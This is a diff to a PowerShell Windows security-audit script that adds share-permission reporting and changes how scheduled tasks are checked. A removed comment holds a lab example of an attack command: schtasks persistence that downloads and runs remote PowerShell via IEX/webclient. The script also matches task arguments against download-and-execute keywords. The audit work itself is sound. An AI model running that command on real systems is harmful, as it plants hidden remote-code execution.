@@ -64,6 +64,8 @@ function reports
 220211.2 - Added < hash hash > to comment out the folder audits.
 220214.1 - Added Driver Query
 220214.1 - Temporary fix to scheduled task where multiple triggers or action breaks the html output
+220215.1 - Report on shares and their permissions
+220216.1 - Fixed Schedule task reporting to show multiple arguments and actions 
 
 #> 
 
@@ -114,7 +116,7 @@ sleep 5
     Add-Member -InputObject $newObjBit -Type NoteProperty -Name TPMSpecVersion -Value $TPMSpecVer
     $fragBitLocker += $newObjBit
     }
-    ELse
+    Else
     { 
     $BitDisabled = "Warning - Bitlocker is disabled Warning"
     $newObjBit = New-Object psObject
@@ -1121,15 +1123,15 @@ sleep 5
             
                 if ($syfoldAcl | where {$_.accesstostring -like "*Users Allow  Write*" -or $_.accesstostring -like "*Users Allow  Modify*" -or $_.accesstostring -like "*Users Allow  FullControl*"})
                 {
-                    $taskUSerPers = "Warning - User are allowed to WRITE or MODIFY to $taskArgs Warning"
+                    $taskUSerPers = "Warning - User are allowed to WRITE or MODIFY $taskArgs Warning"
                 }
                 if ($syfoldAcl | where {$_.accesstostring -like "*Everyone Allow  Write*" -or $_.accesstostring -like "*Everyone Allow  Modify*" -or $_.accesstostring -like "*Everyone Allow  FullControl*"})
                 {
-                    $taskUSerPers = "Warning - Everyone are allowed to WRITE or MODIFY to $taskArgs Warning"
+                    $taskUSerPers = "Warning - Everyone are allowed to WRITE or MODIFY $taskArgs Warning"
                 }
                 if ($syfoldAcl | where {$_.accesstostring -like "*Authenticated Users Allow  Write*" -or $_.accesstostring -like "*Authenticated Users Allow  Modify*" -or $_.accesstostring -like "*Authenticated Users Allow  FullControl*"})
                 {
-                    $taskUSerPers = "Warning - Authenticated User are all0wed to WRITE or MODIFY to $taskArgs Warning"
+                    $taskUSerPers = "Warning - Authenticated User are all0wed to WRITE or MODIFY $taskArgs Warning"
                 }
 
                 $newObjSchedTaskPerms = New-Object -TypeName PSObject
@@ -1137,13 +1139,60 @@ sleep 5
                 Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPath -Value $taskArgs
                 Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskContent -Value $getTaskCon 
                 Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPermissions -Value $taskUSerPers
-
-                #Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskUser -Value $taskUser
-                #Add-Member -InputObject $newObjSchedTaskPerms -Type NoteProperty -Name TaskPermissions -Value $taskUSerPers
                 $SchedTaskPerms += $newObjSchedTaskPerms
             }
         }  
     }
+
+ $getScTask = Get-ScheduledTask 
+ $SchedTaskListings=@()
+
+foreach ($shTask in $getScTask | where {$_.Actions.execute -notlike "*system32*" -and $_.Actions.execute -notlike "*MpCmdRun.exe*"})
+    {
+        $arrayTaskArgs=@()
+        $arrayTaskExe=@()
+        $TaskHash=@()
+        $getTaskCon=@()
+
+        $taskName = $shTask.TaskName
+        $taskPath = $shTask.TaskPath
+        $taskArgs = $shTask.Actions.Arguments 
+        $taskExe =  $shTask.Actions.execute 
+        $taskSet =  $shTask.Settings
+        $taskSour = $shTask.Source
+        $taskTrig = $shTask.Triggers
+        $taskURI =  $shTask.URI
+
+    if ($taskExe -ne $null)
+    {
+        if ($taskArgs -notmatch "^[a-zA-Z]:" -or $taskArgs -match "^[a-zA-Z]:")
+        {
+            foreach($Args in $taskArgs)
+                {
+                $arrayTaskArgs += $Args
+                }
+                $arrayjoinArgs = $arrayTaskArgs -join ", "
+    
+            foreach($Exes in $taskExe)
+                {
+                $arrayTaskExe += $Exes
+                }
+                $arrayjoinExe = $arrayTaskExe -join ", "
+
+            $newObjSchedTaskListings = New-Object -TypeName PSObject
+            Add-Member -InputObject $newObjSchedTaskListings -Type NoteProperty -Name TaskName -Value $taskName
+            Add-Member -InputObject $newObjSchedTaskListings -Type NoteProperty -Name TaskExe -Value $arrayjoinExe
+            Add-Member -InputObject $newObjSchedTaskListings -Type NoteProperty -Name TaskArguments -Value $arrayjoinArgs
+
+            #Add-Member -InputObject $newObjSchedTaskListings -Type NoteProperty -Name TaskContent -Value $getTaskCon 
+            #Add-Member -InputObject $newObjSchedTaskListings -Type NoteProperty -Name TaskPermissions -Value $taskUserPers
+            $SchedTaskListings += $newObjSchedTaskListings
+
+            }
+        }
+    }
+
+<#
 
     $SchedTaskEncode=@()
     #Find hidden code or Base 64 in NON System Directories
@@ -1164,10 +1213,11 @@ sleep 5
         {
             if ($taskArgs -notmatch "^[a-zA-Z]:" -or $taskArgs -match "^[a-zA-Z]:")
             {
-                #if ($taskArgs -like "*encode*"){$taskName = "Warning - Potential Base64 encoded script for $taskName Warning"}
-                #if ($taskArgs -like "*webclient*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
-                #if ($taskArgs -like "*IEX*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
-                #if ($taskArgs -like "*download*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                if ($taskArgs -like "*encode*"){$taskName = "Warning - Potential Base64 encoded script for $taskName Warning"}
+                if ($taskArgs -like "*webclient*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                if ($taskArgs -like "*IEX*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                if ($taskArgs -like "*download*"){$taskName = "Warning - Schedule is making calls off box by $taskName Warning"}
+                else {}
 
                 $newObjSchedTaskEncode = New-Object -TypeName PSObject
                 Add-Member -InputObject $newObjSchedTaskEncode -Type NoteProperty -Name TaskName -Value $taskName
@@ -1178,12 +1228,7 @@ sleep 5
         }
     }    
 
-    <#
-    schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
-    
-    Usernames
-
-    #>
+#>
 
 Write-Host " "
 Write-Host "Completed Scheduled Tasks" -foregroundColor Green
@@ -1634,6 +1679,41 @@ Write-Host "Finised Searching for CreateFile Permissions Vulnerabilities" -foreg
 '#>'
 
 ################################################
+##############  SHARES AND PERMS  ##############
+################################################ 
+
+Write-Host " "
+Write-Host "Auditing Shares and permissions" -foregroundColor Green
+sleep 3
+
+$getShr = Get-SmbShare | where {$_.name -ne "IPC$"}
+$Permarray=@()
+$fragShare=@()
+foreach($shr in $getShr)
+{
+    $Permarray=@()
+    $shrName = $Shr.name
+    $shrPath = $Shr.path
+    $shrDes = $Shr.description
+
+    $getShrPerms = Get-FileShareAccessControlEntry -Name $shr.Name
+    foreach($perms in $getShrPerms)
+        {
+        $Permarray += $perms.AccountName
+        }
+        $arrayjoin = $Permarray -join ",  "
+
+    $newObjShare = New-Object -TypeName PSObject
+    Add-Member -InputObject $newObjShare -Type NoteProperty -Name Name -Value $shrName
+    Add-Member -InputObject $newObjShare -Type NoteProperty -Name Path -Value $shrPath
+    Add-Member -InputObject $newObjShare -Type NoteProperty -Name Perms -Value $arrayjoin
+    $fragShare += $newObjShare
+}
+
+Write-Host " "
+Write-Host "Finised Auditing Shares and permissions" -foregroundColor Green
+
+################################################
 ############  EMBEDDED PASSWORDS  ##############
 ################################################  
 
@@ -1646,7 +1726,7 @@ sleep 7
 #Passwords in Processes
     $getPSPass = gwmi win32_process -ErrorAction SilentlyContinue | Select-Object Caption, Description,CommandLine | where {$_.commandline -like "*pass*" -or $_.commandline -like "*credential*" -or $_.commandline -like "*username*"  }
 
-    $fragPSPass =@()
+    $fragPSPass=@()
         foreach ($PStems in $getPSPass)
         {
 
@@ -2076,11 +2156,9 @@ $descripFirewalls = "Firewalls should always block inbound and exceptions should
 
 $descripTaskSchPerms = "Checks for Scheduled Tasks excluding any that reference System32 as a directory. These potential user created tasks are checked for scripts and their directory permissionss are validated. No user should be allowed to access the script and make amendments, this is a privilege escaltion route." 
 
-$descripTaskSchEncode = "Checks for encoded scripts or powershell that make calls off box." 
+$descripTaskSchEncode = "Checks for encoded scripts, powershell or exe's that make calls off box or run within Task Scheduler" 
 
-
-
-$descriptDriverQuery = "All Drivers are to be signed with a digital signature to verify the integrity of the packages. 64bit kernel Mode drivers must be signed without exception"
+$descriptDriverQuery = "All Drivers should be signed with a digital signature to verify the integrity of the packages. 64bit kernel Mode drivers must be signed without exception"
 
 ################################################
 ################  FRAGMENTS  ###################
@@ -2099,10 +2177,8 @@ $descriptDriverQuery = "All Drivers are to be signed with a digital signature to
     $FragGroupDetails =  $GroupDetails  | ConvertTo-Html -As Table -fragment -PreContent "<h2><span style='color:$titleCol'>Group Members</span></h2>" | Out-String
     $FragPassPol = $PassPol | Select-Object -SkipLast 3 | ConvertTo-Html -As Table -fragment -PreContent "<h2><span style='color:$titleCol'>Password Policy</span></h2>" | Out-String
     $fragInstaApps  =  $InstallApps | Sort-Object publisher,displayname -Unique  | ConvertTo-Html -As Table  -fragment -PreContent "<h2><span style='color:$titleCol'>Installed Applications</span></h2>" | Out-String
-    
     $fragHotFix = $HotFix | ConvertTo-Html -As Table -property HotFixID,InstalledOn,Caption -fragment -PreContent "<h2><span style='color:$titleCol'>Latest 10 Installed Updates</span></h2>" | Out-String
     $fragInstaApps16  =  $InstallApps16 | Sort-Object publisher,displayname -Unique  | ConvertTo-Html -As Table  -fragment -PreContent "<h2><span style='color:$titleCol'>Updates to Office 2016 and older or Updates that create KB's in the Registry</span></h2>" | Out-String
-       
     $fragBios = $bios | ConvertTo-Html -As List -property Name,Manufacturer,SerialNumber,SMBIOSBIOSVersion,ReleaseDate -fragment -PreContent "<h2><span style='color:$titleCol'>Bios Details</span></h2>" | Out-String
     $fragCpu = $cpu | ConvertTo-Html -As List -property Name,MaxClockSpeed,NumberOfCores,ThreadCount -fragment -PreContent "<h2><span style='color:$titleCol'>Processor Details</span></h2>" | Out-String
 
@@ -2126,15 +2202,11 @@ $descriptDriverQuery = "All Drivers are to be signed with a digital signature to
     $frag_wFile =  $fragwFile | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>System Files that are Writeable - Security Risk if Exist</span></h2>" -PostContent "<h4>$descripFile</h4>" | Out-String
     $frag_FWProf =   $fragFWProfile | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Firewall Profile</span></h2>"  -PostContent "<h4>$DescripFirewalls</h4>"| Out-String
     $frag_FW =  $fragFW | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Enabled Firewall Rules</span></h2>" | Out-String
- 
- 
     $frag_TaskPerms =  $SchedTaskPerms | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Scheduled Tasks that call on Files on Storage</span></h2>"  -PostContent "<h4>$descripTaskSchPerms</h4>" | Out-String
-    $frag_TaskEncode =  $SchedTaskEncode | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Scheduled Tasks that contain something Encoded</span></h2>"  -PostContent "<h4>$descripTaskSchEncode</h4>" | Out-String
-
-    $frag_DriverQuery =  $DriverQuery | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Drivers that aren't signed</span></h2>"  -PostContent "<h4>$descriptDriverQuery</h4>" | Out-String
+    $frag_TaskListings =  $SchedTaskListings | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Scheduled Tasks that contain something Encoded</span></h2>"  -PostContent "<h4>$descripTaskSchEncode</h4>" | Out-String
+    $frag_DriverQuery =  $DriverQuery | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Drivers that aren't signed</span></h2>" -PostContent "<h4>$descriptDriverQuery</h4>" | Out-String
+    $frag_Share = $fragShare | ConvertTo-Html -as Table -Fragment -PreContent "<h2><span style='color:$titleCol'>Shares and their Share Permissions</span></h2>"  | Out-String
  
- 
-    
 ################################################
 ############  CREATE HTML REPORT  ##############
 ################################################
@@ -2164,9 +2236,10 @@ $descriptDriverQuery = "All Drivers are to be signed with a digital signature to
     $frag_AutoLogon,
     $frag_UnQu, 
     $frag_TaskPerms,
-    $frag_TaskEncode,
+    $frag_TaskListings,
     $frag_PSPass,
     $frag_LegNIC,
+    $frag_Share,
     $frag_SysRegPerms,
     $frag_SysFolders,
     $frag_createSysFold,
@@ -2208,10 +2281,9 @@ Netbios Node type check reg path and value
 remove extra blanks when listing progs via registry 
 FLTMC.exe - mini driver altitude looking for 'stuff' thats at an altitude to bypass security or encryption
 report on appX bypass and seriousSam
-DRIVERQUERY /SI - driver signing
 Remote desktop and permissions
 get-authenticodesignature
-report on shares
+
 Scheduled tasks - fix required for multi line web output resultsing in system.objec[]
 #>
 
